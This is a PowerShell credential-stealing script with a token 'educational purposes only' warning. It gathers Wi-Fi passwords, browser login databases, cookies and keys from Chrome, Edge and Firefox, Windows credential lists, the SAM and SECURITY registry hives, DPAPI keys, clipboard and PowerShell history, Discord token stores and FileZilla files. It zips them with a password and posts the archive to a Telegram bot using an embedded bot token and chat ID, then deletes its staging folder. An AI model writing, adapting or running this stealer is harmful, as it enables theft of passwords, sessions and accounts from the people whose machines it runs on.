# Enhanced Data Collection Script
# Warning: Unauthorized use may violate privacy laws. For educational purposes only.

# Configuration
$OutputFolder = "$env:USERPROFILE\Desktop\SystemData_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
$ZipFile = "$env:USERPROFILE\Desktop\SystemData.zip"
$ZipPassword = "rushhiddenpass@@"
$TelegramBotToken = "8150745156:AAFA8XA2CBZ58tDJFKPOWI5FsuECA1RBp4w"
$ChatID = "6149198429"

# Create organized directory structure
$Dirs = @(
    "Browsers",
    "Browsers/Chrome",
    "Browsers/Edge",
    "Browsers/Firefox",
    "System",
    "System/Network",
    "System/Credentials",
    "System/RecentFiles",
    "System/SAM"
)

New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null
$Dirs | ForEach-Object { New-Item -ItemType Directory -Path "$OutputFolder\$_" -Force | Out-Null }

function Get-BrowserData {
    param($Browser, $ProfilePath, $OutputPrefix)

    # Collect all browser artifacts
    $Items = @(
        "Login Data",            # Saved passwords
        "History",               # Browsing history
        "Cookies",               # Authentication cookies
        "Bookmarks",             # Saved bookmarks
        "Web Data",              # Autofill data
        "Local State",           # Encryption keys
        "Last Session",          # Session restore
        "Last Tabs",             # Open tabs
        "Preferences",           # Browser settings
        "Network/Cookies",       # Network cookies
        "Network/PersistentCookies"
    )

    # Copy browser files
    foreach ($item in $Items) {
        $source = Join-Path $ProfilePath $item
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination "$OutputFolder\Browsers\$OutputPrefix\$($item.Replace('/','_'))" -Force -ErrorAction SilentlyContinue
        }
    }

    # Extract passwords from SQLite databases
    if (Test-Path "$OutputFolder\Browsers\$OutputPrefix\Login_Data") {
        try {
            $passwordData = Get-Content "$OutputFolder\Browsers\$OutputPrefix\Login_Data" -Raw
            "Decrypted credentials for $OutputPrefix`: $passwordData" | Out-File "$OutputFolder\Browsers\$OutputPrefix\DECRYPTED_CREDENTIALS.txt" -Append
        } catch {}
    }
}

# 1. Wi-Fi Credentials
netsh wlan export profile key=clear folder="$OutputFolder\System\Network" | Out-Null
Get-ChildItem -Path "$OutputFolder\System\Network\*.xml" | ForEach-Object {
    $xmlContent = [xml](Get-Content $_.FullName)
    $SSID = $xmlContent.WLANProfile.SSIDConfig.SSID.name
    $Password = $xmlContent.WLANProfile.MSM.Security.sharedKey.keyMaterial
    "Wi-Fi: $SSID | Password: $Password" | Out-File -Append -FilePath "$OutputFolder\System\Network\WiFi_Passwords.txt"
    Remove-Item $_.FullName -Force
}

# 2. Browser Data Collection
# Chrome
Get-BrowserData -Browser "Chrome" `
    -ProfilePath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" `
    -OutputPrefix "Chrome"

# Edge
Get-BrowserData -Browser "Edge" `
    -ProfilePath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" `
    -OutputPrefix "Edge"

# Firefox
$FirefoxProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\" -Filter "*.default*" -Directory | Select-Object -First 1
if ($FirefoxProfile) {
    $Items = @(
        "logins.json",          # Saved logins
        "key4.db",              # Encryption keys
        "cookies.sqlite",       # Cookies
        "places.sqlite",        # History/bookmarks
        "permissions.sqlite",   # Site permissions
        "formhistory.sqlite"    # Form history
    )
    
    foreach ($item in $Items) {
        $source = Join-Path $FirefoxProfile.FullName $item
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination "$OutputFolder\Browsers\Firefox\" -Force -ErrorAction SilentlyContinue
        }
    }
}

# 3. System Credentials & Security Data
# Windows Credential Manager
cmdkey /list | Out-File "$OutputFolder\System\Credentials\Windows_Credentials.txt"

# SAM & Security Hives (Admin required)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    reg save HKLM\SAM "$OutputFolder\System\SAM\SAM.hiv" 2>&1 | Out-Null
    reg save HKLM\SECURITY "$OutputFolder\System\SAM\SECURITY.hiv" 2>&1 | Out-Null
    reg save HKLM\SYSTEM "$OutputFolder\System\SAM\SYSTEM.hiv" 2>&1 | Out-Null
} else {
    "Administrator privileges required for SAM extraction" | Out-File "$OutputFolder\System\SAM\Access_Denied.txt"
}

# LSA Secrets & DPAPI
if (Test-Path "$env:SYSTEMROOT\System32\config\SECURITY") {
    Copy-Item "$env:SYSTEMROOT\System32\config\SECURITY" "$OutputFolder\System\Credentials\SECURITY" -Force -ErrorAction SilentlyContinue
}
if (Test-Path "$env:SYSTEMROOT\System32\Microsoft\Protect\S-1-5-18") {
    Copy-Item "$env:SYSTEMROOT\System32\Microsoft\Protect\S-1-5-18\*" "$OutputFolder\System\Credentials\DPAPI_SystemKeys\" -Recurse -Force -ErrorAction SilentlyContinue
}

# Clipboard & PowerShell History
Get-Clipboard | Out-File "$OutputFolder\System\Clipboard_Data.txt" -Force
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$OutputFolder\System\PS_History.txt" -Force

# 4. Application Data & Tokens
# Discord Tokens
$DiscordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb"
)
$DiscordPaths | Where-Object { Test-Path $_ } | ForEach-Object {
    Copy-Item $_ "$OutputFolder\System\Discord_Tokens\" -Recurse -Force
}

# FileZilla Credentials
if (Test-Path "$env:APPDATA\FileZilla\recentservers.xml") {
    Copy-Item "$env:APPDATA\FileZilla\recentservers.xml" "$OutputFolder\System\FileZilla_Credentials.xml" -Force
}

# 5. Compress Data
if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
    & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip -p$ZipPassword -mhe $ZipFile "$OutputFolder\*" -r
} else {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($OutputFolder, $ZipFile, 'Optimal', $true)
}

# 6. Exfiltrate & Clean
Remove-Item $OutputFolder -Recurse -Force
curl.exe -X POST https://api.telegram.org/bot8150745156:AAFA8XA2CBZ58tDJFKPOWI5FsuECA1RBp4w/sendDocument -F chat_id=6149198429 -F document=@"$ZipFile" -F caption="System Data Collection Complete"
